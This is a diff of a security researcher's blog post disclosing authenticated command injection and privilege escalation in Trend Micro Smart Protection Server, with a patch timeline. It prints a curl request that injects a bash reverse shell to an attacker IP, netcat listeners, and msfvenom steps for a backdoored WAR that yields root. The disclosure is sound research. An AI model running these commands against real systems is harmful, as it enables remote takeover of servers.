@@ -2,6 +2,9 @@
 layout: post
 title:  "Trend Micro Bug Hunting - Part I"
 date:   2016-08-08 07:00:00
+author: qkaiser
+excerpt: |
+    Trend Micro Smart Protection Server is affected by 3 directory traversal vulnerabilities, 9 vectors to gain remote command execution, and another to obtain elevated privileges from there. Those vulnerabilities can be exploited by authenticated user on the web administration panel of TMSPS.
 comments: true
 categories: pentesting trendmicro
 ---
@@ -24,8 +27,6 @@ Trend Micro Advisory is available on their [business support website](https://su
 #### Affected Versions
 
 * Trend Micro Smart Protection Server version 2.5 to 3.0 included
-
-
 
 ### Authenticated RCE - Technical Description
 
@@ -203,13 +204,13 @@ static function SetFirewall($IP, $Netmask) {
 
 The different vulnerabilities were easily proven with curl, such as by using this command where get a reverse shell using interactive bash:
 
-<pre>
+{% highlight bash %}
 $ curl 'https://127.0.0.1:8443/php/admin_notification.php' -H 'Cookie: 590848d208960aa9=q3fk366otcapsp7vur00tp0to3' -H 'Origin: https://127.0.0.1:8443' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: https://127.0.0.1:8443/php/admin_notification.php?sid=590848d208960aa9' -H 'Connection: keep-alive' --data 'EnableSNMP=on&Community=hello&submit=Save&pubkey=snip&sid=590848d208960aa9&spare_EnableSNMP=1&spare_Community=test;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.25%2F4444%200%3E%261;&spare_EnableIPRestriction=0&spare_AllowGroupIP=&spare_AllowGroupNetmask=' --compressed --insecure --http1.0
-</pre>
+{% endhighlight %}
 
 Let's run netcat and wait for the shell to drop !
 
-<pre>
+```
 $ nc -lv 4444
 bash: no job control in this shell
 bash-3.2$ id
@@ -218,39 +219,38 @@ bash-3.2$ whoami
 webserv
 bash-3.2$ pwd
 /var/www/AdminUI/php
-</pre>
+```
 
 #### Privilege Escalation
 
 It got interesting when I discovered that TMSPS servers are running an Apache Solr server to - presumably - communicate with OfficeScan clients.
 Solr runs on Jetty and the webserv user has write access to the webapps directory. However, auto-deploy of war files is not enabled by default.
 
-<pre>
+```
 bash-3.2$ cd /var/tmcss/solr/webapps
 bash-3.2$ ls -alh
 total 3.9M
 drwxr-xr-x 2 webserv webserv 4.0K Apr 29 21:19 .
 drwxr-xr-x 9 webserv webserv 4.0K Apr 29 20:03 ..
 -rw-r--r-- 1 webserv webserv 3.9M Nov  6  2009 solr.war
-</pre>
+```
 
 Furthermore, I found out that this server is running - you guessed it - as root.
 
-<pre>
+```
 bash-3.2$ ps aux
 --snip--
 root      2265  0.3  6.8 612340 69804 ?        Sl   22:03   0:03 /usr/java/default/bin/java -Dsolr.solr.home=/var/tmcss/solr/solr -Djetty.port=8983 -Djetty.logs=/var/tmcss/solr/logs -Djetty.home=/var/tmcss/solr -Djava.io.tmpdir=/tmp -jar /var/tmcss/solr/start.jar /var/tmcss/solr/etc/jetty-logging.xml /var/tmcss/solr/etc/jetty.xml
-</pre>
+```
 
 From there, and making the assumptions that we already have credentials, we could drop a backdoored .war file there and restart the logging service from the custom CLI in order to get a shell with root privileges.
 
-
-<pre>
+{% highlight bash %}
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > solr.war
 Payload size: 1099 bytes
-</pre>
+{% endhighlight %}
 
-<pre>
+```
 >
 Last login: Wed Jul  6 22:16:01 2016 from 10.0.2.2
 
@@ -272,23 +272,23 @@ Starting Jetty: STARTED Jetty Wed Jul  6 22:46:41 CEST 2016
 2016-07-06 22:46:41.825::INFO:  Logging to STDERR via org.mortbay.log.StdErrLog
 2016-07-06 22:46:41.939::INFO:  Redirecting stderr/stdout to /var/tmcss/debuglogs/jetty.log
 >
-</pre>
+```
 
-<pre>
+{% highlight bash %}
 $ tail /var/tmcss/debuglogs/jetty.log
 2016-07-06 22:46:42.516::INFO:  Extract jar:file:/var/tmcss/solr/webapps/solr.war!/ to /var/tmcss/solr/work/Jetty_0_0_0_0_8983_solr.war__solr__k1kf17/webapp
 2016-07-06 22:46:42.724::INFO:  Started SocketConnector @ 0.0.0.0:8983
-</pre>
+{% endhighlight %}
 
 And once you request your backdoor JSP file, your root shell will drop :)
 
-<pre>
+```
 $ nc -l 4445
 id
 uid=0(root) gid=0(root) groups=0(root),6(disk)
 pwd
 /var/tmcss/solr
-</pre>
+```
 
 Note that the Jetty server is configured in such a way that it'll only load war files named "solr.war" and that you'll need to request the jsp backdoor by prepending "solr" to it. It should be possible to update the Jetty configuration but, you know, I'm lazy. 
 
@@ -420,10 +420,10 @@ Part II will discuss other Trend Micro products where I managed to be greeted wi
 
 ## Disclosure Timeline
 
-* 2016-05-01: Advisory sent to Trend Micro 
-* 2016-05-10: Trend Micro get back to me with an estimate for a fix
-* 2016-06-23: Trend Micro released patch
-* 2016-08-08: Release of advisory
+* **2016-05-01**: Advisory sent to Trend Micro 
+* **2016-05-10**: Trend Micro get back to me with an estimate for a fix
+* **2016-06-23**: Trend Micro released patch
+* **2016-08-08**: Release of advisory
 
 ## CVE Identifiers
 
